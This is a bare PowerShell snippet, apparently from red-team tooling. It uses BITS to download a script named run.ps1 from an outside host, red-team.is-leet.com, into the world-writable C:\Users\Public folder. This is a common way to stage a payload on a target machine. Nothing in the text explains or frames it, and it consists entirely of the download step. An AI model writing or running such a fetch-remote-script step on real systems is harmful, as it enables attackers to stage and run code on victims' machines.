
$url = 'http://red-team.is-leet.com/run.ps1'
$out = 'C:\Users\Public\run.ps1'

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $out
